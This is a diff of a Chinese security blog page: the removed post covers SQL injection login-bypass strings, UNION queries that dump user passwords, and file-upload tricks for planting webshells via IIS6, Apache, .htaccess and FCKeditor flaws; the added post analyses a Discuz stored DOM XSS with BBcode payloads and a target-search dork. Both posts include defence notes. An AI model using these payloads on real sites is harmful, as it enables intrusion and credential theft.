@@ -6,20 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>SQL注入与文件上传漏洞 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>Discuz全版本存储型DOM XSS | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="SQL注入检测 单引号法 如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入   1=1 和 1=2 法 and 1=1 和 and 1=2 提交，返回不同的页面，则说明存在SQL注入漏洞    OR漏洞 &amp;#39;or 1=1--  【aspx】  &amp;#39; or&amp;#39;=&amp;#39;or&amp;#39; 【asp】 &amp;#39; or 1=1/* 【php】  select *">
+  <meta name="description" content="ZoomEye Dorkapp:Discuz!country:China  漏洞成因JS原生取ELEMENT中HTML内容的方法，会将服务端转义过的单双引号实体编码进行反转。Discuz!使用的BBcode语言。 payloadpayload1：[align=&amp;quot;onmouseover=&amp;quot;alert(1)]payload2:[email=2&amp;quot;onmouseover=&amp;q">
 <meta name="keywords" content="Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入与文件上传漏洞">
-<meta property="og:url" content="http://showmeshell.top/2018/11/25/SQL注入与文件上传漏洞/index.html">
+<meta property="og:title" content="Discuz全版本存储型DOM XSS">
+<meta property="og:url" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="SQL注入检测 单引号法 如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入   1=1 和 1=2 法 and 1=1 和 and 1=2 提交，返回不同的页面，则说明存在SQL注入漏洞    OR漏洞 &amp;#39;or 1=1--  【aspx】  &amp;#39; or&amp;#39;=&amp;#39;or&amp;#39; 【asp】 &amp;#39; or 1=1/* 【php】  select *">
+<meta property="og:description" content="ZoomEye Dorkapp:Discuz!country:China  漏洞成因JS原生取ELEMENT中HTML内容的方法，会将服务端转义过的单双引号实体编码进行反转。Discuz!使用的BBcode语言。 payloadpayload1：[align=&amp;quot;onmouseover=&amp;quot;alert(1)]payload2:[email=2&amp;quot;onmouseover=&amp;q">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-25T04:08:14.136Z">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/1.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/2.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/3.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/4.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/5.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/6.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/7.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/8.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/9.png">
+<meta property="og:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/10.png">
+<meta property="og:updated_time" content="2018-11-25T06:32:12.794Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入与文件上传漏洞">
-<meta name="twitter:description" content="SQL注入检测 单引号法 如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入   1=1 和 1=2 法 and 1=1 和 and 1=2 提交，返回不同的页面，则说明存在SQL注入漏洞    OR漏洞 &amp;#39;or 1=1--  【aspx】  &amp;#39; or&amp;#39;=&amp;#39;or&amp;#39; 【asp】 &amp;#39; or 1=1/* 【php】  select *">
+<meta name="twitter:title" content="Discuz全版本存储型DOM XSS">
+<meta name="twitter:description" content="ZoomEye Dorkapp:Discuz!country:China  漏洞成因JS原生取ELEMENT中HTML内容的方法，会将服务端转义过的单双引号实体编码进行反转。Discuz!使用的BBcode语言。 payloadpayload1：[align=&amp;quot;onmouseover=&amp;quot;alert(1)]payload2:[email=2&amp;quot;onmouseover=&amp;q">
+<meta name="twitter:image" content="http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -149,89 +160,70 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-SQL注入与文件上传漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Discuz全版本存储型DOM-XSS" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      SQL注入与文件上传漏洞
+      Discuz全版本存储型DOM XSS
     </h1>
   
 
         
-        <a href="/2018/11/25/SQL注入与文件上传漏洞/" class="archive-article-date">
-  	<time datetime="2018-11-25T04:07:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
+        <a href="/2018/11/25/Discuz全版本存储型DOM-XSS/" class="archive-article-date">
+  	<time datetime="2018-11-25T06:29:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="SQL注入检测"><a href="#SQL注入检测" class="headerlink" title="SQL注入检测"></a>SQL注入检测</h3><ul>
-<li>单引号法<ul>
-<li>如果页面不能正常显示，浏览器返回一些异常信息，则说明该链接可能存在注入</li>
-</ul>
-</li>
-<li>1=1 和 1=2 法<ul>
-<li>and 1=1 和 and 1=2 提交，返回不同的页面，则说明存在SQL注入漏洞</li>
-</ul>
-</li>
-</ul>
-<h3 id="OR漏洞"><a href="#OR漏洞" class="headerlink" title="OR漏洞"></a>OR漏洞</h3><ul>
-<li><p><code>&#39;or 1=1--</code>  【aspx】  <code>&#39; or&#39;=&#39;or&#39;</code> 【asp】 <code>&#39; or 1=1/*</code> 【php】</p>
-<ul>
-<li><p><code>select * from admin where Name=&#39; &#39; or 1=1--&#39;and password=&#39;xx&#39;</code></p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">asp、aspx、php、jsp万能密码大全</span><br><span class="line">asp aspx万能密码</span><br><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">2： &apos;)or(&apos;a&apos;=&apos;a</span><br><span class="line">3：or 1=1--</span><br><span class="line">4：&apos;or 1=1--</span><br><span class="line">5：a&apos;or&apos; 1=1--</span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line">7：&apos;or&apos;a&apos;=&apos;a</span><br><span class="line">8：&quot;or&quot;=&quot;a&apos;=&apos;a</span><br><span class="line">9：&apos;or&apos;&apos;=&apos;</span><br><span class="line">10：&apos;or&apos;=&apos;or&apos;</span><br><span class="line">11：1 or &apos;1&apos;=&apos;1&apos;=1</span><br><span class="line">12：1 or &apos;1&apos;=&apos;1&apos; or 1=1</span><br><span class="line">13： &apos;OR 1=1%00</span><br><span class="line">14： &quot;or 1=1%00</span><br><span class="line">15：&apos;xor</span><br><span class="line">16： 用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin）</span><br><span class="line">密码 1</span><br><span class="line">17..admin&apos; or &apos;a&apos;=&apos;a 密码随便</span><br><span class="line">PHP万能密码</span><br><span class="line">&apos;or 1=1/*</span><br><span class="line">User: something</span><br><span class="line">Pass: &apos; or &apos;1&apos;=&apos;1</span><br><span class="line">jsp 万能密码</span><br><span class="line">1&apos;or&apos;1&apos;=&apos;1</span><br><span class="line">admin&apos; or 1=1/*</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="MySQL注入技术"><a href="#MySQL注入技术" class="headerlink" title="MySQL注入技术"></a>MySQL注入技术</h3><blockquote>
-<p>在MySQL4及之前的版本中，由于不支持子语句查询，而且当<code>php.ini</code>配置文件中的<code>magic_quotes_gpc</code>参数设置为<code>on开启</code>时，提交的变量中包含’单引号，双引号’以及反斜线，and和空字符等危险的字符，都会被数据库自动转为含有反斜线的转义字符。</p>
-</blockquote>
-<blockquote>
-<p>在MySQL 5版本，由于新增加了一个<code>information_schema</code>库，该库中存储了数据库信息内容，可以直接爆库，爆表，爆字段，让注入变简单。</p>
-</blockquote>
-<h4 id="1-MySQL4-注入技术"><a href="#1-MySQL4-注入技术" class="headerlink" title="1.MySQL4 注入技术"></a>1.MySQL4 注入技术</h4><p>只能采用类似Access的方法进行查询猜解。(常见的表名和字段名)</p>
-<p>利用order by获得当前表的字段数，再使用union select联合查询来获取数据库信息。</p>
-<h4 id="MySQL注入点"><a href="#MySQL注入点" class="headerlink" title="MySQL注入点"></a>MySQL注入点</h4><ul>
-<li><p>注入类型判断</p>
-<ul>
-<li><p>数字型注入：<code>select * from news where id =$id</code></p>
-</li>
-<li><p>字符型注入：<code>select * from news where username=&#39;$name&#39;</code>闭合单引号</p>
-</li>
-<li><p>搜索型注入：<code>select * from news where password like &#39;%best%&#39;</code></p>
-<p>注入： <code>select * from news where password like &#39;%best%&#39;union select 1,version(),2,3,4,5&#39;%%&#39;</code></p>
-<p>输入”<code>id=xxx%&#39;union select 1,version(),2,3,4,5&#39;%</code>达到前后闭合</p>
-</li>
-</ul>
+        <h2 id="ZoomEye-Dork"><a href="#ZoomEye-Dork" class="headerlink" title="ZoomEye Dork"></a>ZoomEye Dork</h2><p><code>app:Discuz!country:China</code> </p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JS原生取ELEMENT中HTML内容的方法，会将服务端转义过的单双引号实体编码进行反转。<br>Discuz!使用的BBcode语言。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>payload1：<br><code>[align=&quot;onmouseover=&quot;alert(1)]</code><br>payload2:<br><code>[email=2&quot;onmouseover=&quot;alert(2)]2[/email]</code></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>发表帖子，编辑器内输入payload<br>支持的bbcode类型可在bbcode.js中查看</p>
+<h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><p>过滤转义<br>白名单机制<br>使用一些在线防护产品</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul>
+<li><p>利用Payload追踪分析漏洞成因。首先在评论处提交Payload：</p>
+<p><code>[email=2&quot;onmouseover=&quot;alert(2)]2[/email]</code></p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/1.png" alt="1"></p>
+<p>服务器对引号等敏感符号有过滤，因此提交后，查看源代码，就会发现引号已经被实体编码。</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/2.png" alt="2"></p>
+<p>普通用户提交的评论，管理员有权限对其进行修改编辑，当管理对用户的评论点击管理时，前端JS代码就开始处理，弹出一个编辑框供管理或版主操作。在JS代码处理的过程中，首先获取用户评论的内容，代码位于当前页面中：</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/3.png" alt="3"></p>
+<p>而<code>$()</code> 函数原型位于<code>/static/js/common.js</code>中：</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/4.png" alt="4"></p>
+<p>使用了原生的 <code>document.getElementById()</code>函数来获取页面中的对应对象，此处获取的是标有<code>id=”e_textarea”</code>的对象，其对应的值为用户评论的内容。</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/5.png" alt="5"></p>
+<p>而由于JS原生函数的原因，被服务器后端转义的引号会被重新是渲染回引号：</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/6.png" alt="6"></p>
+<p>获取到<code>id=”e_textarea”</code>对象后，代码对浏览器进行了判断，并将结果赋值给变量 <code>var wysiwyg</code>。</p>
+<p>在页面上另一处JS代码判断了变量<code>wysiwyg</code>的值，然后开始渲染编辑框：</p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/7.png" alt="7"></p>
+<p>在前面<code>wysiwyg</code>变量的值为1，所以会执行如下代码：</p>
+<p><code>newEditor(1, bbcode2html(textobj.value))</code></p>
+<p>其中<code>textobj.value</code>的值为：<code>[email=2&quot;onmouseover=&quot;alert(2)]2[/email]</code>（经过<code>document.getElementById()</code>获取的对象解析了实体编码）</p>
+<p>在进行newEditor()时，会对传入的内容使用函数bbcode2html()进行编码过滤，其函数原型位于<code>/static/js/bbcode.js</code>，下面是Discuz对程序所支持的shortcode进行处理的部分代码。 </p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/8.png" alt="8"></p>
+<p>程序匹配其支持的shortcode然后正则替换为相应的前端格式代码，因此次测试的payload为<code>[email=2”onmouseover=”alert(2)]2[/email]</code>，因此图中红色标注的代码会得到执行。</p>
+<p><code>str = str.replace(/\[email=(.[^\[]*)\](.*?)\[\/email\]/ig, &#39;[$2](mailto:$1)&#39;);</code></p>
+<p>经过正则匹配替换后，str的值会变为：<code>[2](mailto:2)</code></p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/9.png" alt="9"></p>
+<p>最终bbcode2html()函数会返回经过转换后的textobj.value，值为：<code>[2](mailto:2)</code></p>
+<p>然后调用newEditor()函数进编辑框的渲染，其函数原型位于<code>/static/js/editor.js</code></p>
+<p><img src="/2018/11/25/Discuz全版本存储型DOM-XSS/10.png" alt="10"></p>
+<p>从函数原型可以看到，代码再次判断浏览器类型然后开始渲染，由于<code>wysiwyq</code>变量的值为1，最终会执行</p>
+<p><code>writeEditorContents(isUndefined(initialtext) ? textobj.value: initialtext);</code></p>
+<p>而调用newEditor()函数时，传递了initialtext参数，其值就为经过bbcode2html()函数处理后的textobj.value的值。</p>
+<p>前端JS最终使用writeEditorContents()函数对页面进行渲染，其过程中会将initialtext变量的值直接写入到页面中，最终形成XSS。</p>
 </li>
 </ul>
-<h4 id="判断注入点提交方式"><a href="#判断注入点提交方式" class="headerlink" title="判断注入点提交方式"></a>判断注入点提交方式</h4><ul>
-<li>注入点是GET，POST，COOKIES</li>
-</ul>
-<h4 id="使用order-by查询字段"><a href="#使用order-by查询字段" class="headerlink" title="使用order by查询字段"></a>使用order by查询字段</h4><p><code>xxxxx?id=1&#39; order by x</code>   x为数字，测试有字段几列</p>
-<h4 id="使用联合查询来查询当前数据库相关信息"><a href="#使用联合查询来查询当前数据库相关信息" class="headerlink" title="使用联合查询来查询当前数据库相关信息"></a>使用联合查询来查询当前数据库相关信息</h4><p><code>&#39;union select user(),database()+-+</code></p>
-<p><code>&#39;union select 1,version()+-+</code></p>
-<h4 id="查询网站用户名和密码"><a href="#查询网站用户名和密码" class="headerlink" title="查询网站用户名和密码"></a>查询网站用户名和密码</h4><p><code>&#39;union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761</code> 查询库 dvwa</p>
-<p><code>&#39;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x64767761</code>查询表中列字段 users</p>
-<p><code>&#39;union select user,password from users</code></p>
-<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>burpsuite-repeater-将注入点加在cookie后面。</p>
-<h2 id="空字节截断目录路径检测绕过类上传漏洞"><a href="#空字节截断目录路径检测绕过类上传漏洞" class="headerlink" title="空字节截断目录路径检测绕过类上传漏洞"></a>空字节截断目录路径检测绕过类上传漏洞</h2><p>burp抓包后，上传的为一句话的jpg，路径中截断<code>xxx/1.php .jpg</code> 在hex模式中将20改为00 实现截断后面的jpg，服务器只保留了1.php</p>
-<h2 id="IIS6-0目录路径检测解析绕过上传漏洞"><a href="#IIS6-0目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0目录路径检测解析绕过上传漏洞"></a>IIS6.0目录路径检测解析绕过上传漏洞</h2><p>burp抓包后，上传的为一句话的asp，在路径中改为<code>xxx/1.asp/</code>，上传后缀改为jpg。在iis6.0中会将目录下的内容全部解析为asp文件</p>
-<h2 id="IIS6-0站上的解析缺陷绕过上传漏洞"><a href="#IIS6-0站上的解析缺陷绕过上传漏洞" class="headerlink" title="IIS6.0站上的解析缺陷绕过上传漏洞"></a>IIS6.0站上的解析缺陷绕过上传漏洞</h2><p>burp抓包后，上传的为一句话的php，在地址路径中改为<code>xxx/1.php;</code>,上传后的后缀改为jpg，以1.php；实现截断。木马地址和1.php同一级目录。</p>
-<h2 id="Apache解析缺陷绕过上传漏洞"><a href="#Apache解析缺陷绕过上传漏洞" class="headerlink" title="Apache解析缺陷绕过上传漏洞"></a>Apache解析缺陷绕过上传漏洞</h2><p>直接改后缀，<code>xx.php.7z</code>,如果没有7z的解析，就会以php为解析格式</p>
-<h2 id="htaccess文件上传解析漏洞"><a href="#htaccess文件上传解析漏洞" class="headerlink" title=".htaccess文件上传解析漏洞"></a>.htaccess文件上传解析漏洞</h2><p><a href="https://www.centos.bz/2017/11/apache-htaccess%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%E5%92%8C%E9%85%8D%E7%BD%AE%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.centos.bz/2017/11/apache-htaccess%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%E5%92%8C%E9%85%8D%E7%BD%AE%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</a><br><code>AddType      application/x-httpd-php          .jpg</code> .htaccess内容，将jpg后缀的文件都以php文件来解析<br>上传.htaccesss文件</p>
-<h2 id="FCK编辑器版本识别及信息收集"><a href="#FCK编辑器版本识别及信息收集" class="headerlink" title="FCK编辑器版本识别及信息收集"></a>FCK编辑器版本识别及信息收集</h2><p><code>https://cloud.tencent.com/developer/news/210677</code>博客详细<br>1.查看FCK版本地址：<br>FCKeditor/_samples/default.html 编辑器也可以达到上传点。<br>FCKeditor/_whatsnew.html<br>2.各版本相应的上传点地址<br>FCKeditor v2.4.2<br>FCKeditor/editor/filemanager/browser/default/connectors/test.html<br>FCKeditor/editor/filemanager/upload/test.html<br>FCKeditor v2.6.6<br>FCKeditor/editor/filemanager/connectors/test.html<br>FCKeditor/editor/filemanager/connectors/uploadtest.html</p>
-<h2 id="利用FCK编辑器解析漏洞突破检测上传后门的测试"><a href="#利用FCK编辑器解析漏洞突破检测上传后门的测试" class="headerlink" title="利用FCK编辑器解析漏洞突破检测上传后门的测试"></a>利用FCK编辑器解析漏洞突破检测上传后门的测试</h2><p>FCKeditor 2.6.6版本 上传地址中上传，与2.4.2版本路径不同而已。<br>利用apache解析漏洞，创建1.asp文件夹，在此文件目录下创建2.asp文件夹。<br>创建文件夹<code>/1.asp/2.asp</code> 会解析为1.asp文件夹和2_asp文件夹（apache将.转化为下划线）。<br>以一句话木马改为jpg格式，上传到1.asp文件夹下，可解析为asp文件。</p>
-<h2 id="上传漏洞防御"><a href="#上传漏洞防御" class="headerlink" title="上传漏洞防御"></a>上传漏洞防御</h2><ul>
-<li>客户端检测，使用js对上传图片检测，包括文件大小，文件扩展名，文件类型等。</li>
-<li>服务端检测，对文件大小，文件路径，文件扩展名，文件类型，文件内容检测，对文件重命名</li>
-<li>其他限制，服务器端上传目录设置不可用执行权限。</li>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>1：利用HttpOnly HttpOnly最初是由微软提出的，目前已经被多款流行浏览器厂商所采用。HttpOnly的作用不是过滤XSS跨站脚本攻击，而是浏览器将禁止页面的Javascript访问带有HttpOnly属性的Cookie，解决XSS跨站脚本攻击后的Cookie会话劫持行为。</li>
+<li>2：完善的输入和输出检查 由于三种XSS跨站脚本攻击类型的漏洞成因可不相同，针对输入输出的检查一部分适用于反射型XSS与存储型XSS。输入检查在大多数的时候都是对可信字符的检查或输入数据格式的检查，如用户输入的注册账号信息中只允许包括字母、数字、下划线和汉字等，对于输入的一切非白名单内的字符均认为是非法输入。数据格式如输入的IP地址、电话号码、邮件地址、日期等数据都具有一定的格式规范，只有符合数据规范的输入信息才允许通过检查。</li>
+<li>3：使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用使用随机函数改写了文件名和路径，将极大增加攻击成本。与此同时，像1.php.rar.rar、或者1.xml这种文件，都因为文件名被改写而无法成功实施攻击。</li>
 </ul>
 
       
@@ -333,7 +325,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/11/25/SQL注入与文件上传漏洞/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/11/25/Discuz全版本存储型DOM-XSS/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -347,18 +339,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/11/25/Discuz全版本存储型DOM-XSS/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Discuz全版本存储型DOM XSS
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/11/20/如何防止CSRF攻击/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">如何防止CSRF攻击</div>
+    <a href="/2018/11/25/SQL注入与文件上传漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQL注入与文件上传漏洞</div>
       <i class="icon-circle-right"></i>
     </a>
   
